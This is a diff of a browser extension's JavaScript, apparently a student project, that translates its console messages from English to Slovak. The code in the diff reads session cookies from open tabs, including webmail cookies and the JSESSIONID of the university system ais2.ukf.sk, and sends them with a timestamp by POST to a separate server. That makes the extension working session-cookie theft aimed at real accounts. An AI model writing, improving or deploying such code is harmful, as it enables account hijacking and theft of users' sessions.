@@ -25,7 +25,7 @@ const TARGETS = [
 // Získanie cookie podľa typu aplikácie
 
 function readCookie(target) {
-  console.log("Trying to read cookie:", target.cookieName);
+  console.log("Snazim sa precitat cookie:", target.cookieName);
 
   // Webmail využíva štandardnú cookie
   if (target.type === "simple") {
@@ -36,7 +36,7 @@ function readCookie(target) {
       },
       (cookie) => {
         if (!cookie) {
-          console.log(`[INFO] Cookie ${target.cookieName} NOT FOUND`);
+          console.log(`[INFO] Cookie ${target.cookieName} SA NENASLO !`);
           return;
         }
 
@@ -56,7 +56,7 @@ function readCookie(target) {
         const jsession = cookies.find(c => c.name === "JSESSIONID");
 
         if (!jsession) {
-          console.log("[INFO] JSESSIONID NOT FOUND on ais2.ukf.sk");
+          console.log("[INFO] JSESSIONID SA NENASLO na ais2.ukf.sk");
           return;
         }
 
@@ -69,7 +69,7 @@ function readCookie(target) {
 
 // Odoslanie získanej cookie na serverovú časť aplikácie
 function sendToServer(cookieName, value) {
-  console.log("Sending to server:", SERVER_URL);
+  console.log("Posielam na server:", SERVER_URL);
 
   fetch(SERVER_URL, {
     method: "POST",
@@ -82,19 +82,19 @@ function sendToServer(cookieName, value) {
       timestamp: Date.now()
     })
   })
-    .then(() => console.log(`[OK] Sent ${cookieName}`))
-    .catch(err => console.error("[ERROR] Sending failed:", err));
+    .then(() => console.log(`[OK] Odoslane ${cookieName}`))
+    .catch(err => console.error("[ERROR] Odosielanie zlyhalo:", err));
 }
 
 // Spracovanie aktuálne otvorenej karty
 function handleTab(tab) {
   if (!tab || !tab.url) return;
 
-  console.log("Current tab URL:", tab.url);
+  console.log("Aktualna tab URL:", tab.url);
 
   for (const target of TARGETS) {
     if (tab.url.startsWith(target.url)) {
-      console.log("Matched tab:", tab.url);
+      console.log("Zhoda tabu:", tab.url);
       readCookie(target);
     }
   }
